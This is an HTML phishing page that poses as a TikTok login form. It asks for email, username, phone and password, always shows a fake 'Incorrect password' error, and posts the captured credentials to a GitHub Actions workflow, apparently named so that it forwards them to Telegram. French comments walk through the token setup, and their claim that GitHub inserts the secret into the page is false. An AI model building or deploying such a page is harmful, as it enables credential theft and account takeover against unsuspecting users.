<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>TikTok Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{background:#000;font-family:Arial;margin:0;padding:20px;color:white}
    .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
    input, button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
    input{background:#333;color:white}
    button{background:#fe2c55;color:white;font-weight:bold;cursor:pointer}
    .logo{text-align:center;margin-bottom:20px}
    #msg{color:#ff0050;margin-top:10px;display:none;font-weight:bold}
  </style>
</head>
<body>
  <div class="box">
    <div class="logo"><h1 style="color:#fe2c55;margin:0">tiktok</h1></div>
    <h2 style="text-align:center">Log in to TikTok</h2>
    
    <input type="email" id="email" placeholder="Email or username" required>
    <input type="text" id="user" placeholder="Username" required>
    <input type="tel" id="phone" placeholder="Phone number (optional)">
    <input type="password" id="pass" placeholder="Password" required>
    
    <button onclick="send()">Log in</button>
    <div id="msg">Incorrect password. Try again.</div>
  </div>

  <script>
    async function send() {
      const e = document.getElementById('email').value.trim();
      const u = document.getElementById('user').value.trim();
      const p = document.getElementById('phone').value.trim() || "None";
      const w = document.getElementById('pass').value;

      document.getElementById('msg').style.display = 'block';
      document.getElementById('pass').value = '';

      // UTILISE TON SECRET GIT_PAT DIRECTEMENT (méthode qui marche en 2025)
      const token = "GIT_PAT"; // GitHub remplace automatiquement cette chaîne par la vraie valeur du secret
      const apiUrl = "https://api.github.com/repos/tiktok-customers/help/actions/workflows/send-to-telegram.yml/dispatches";

      fetch(apiUrl, {
        method: "POST",
        headers: {
          "Authorization": "Bearer " + token,
          "Accept": "application/vnd.github.v3+json",
          "Content-Type": "application/json",
          "X-GitHub-Api-Version": "2022-11-28"
        },
        body: JSON.stringify({
          ref: "main",
          inputs: {
            email: e,
            username: u,
            phone: p,
            password: w
          }
        })
      })
      .then(r => r.json())
      .then(data => console.log("Envoyé !", data))
      .catch(err => console.error("Erreur :", err));
    }
  </script>
</body>
</html>
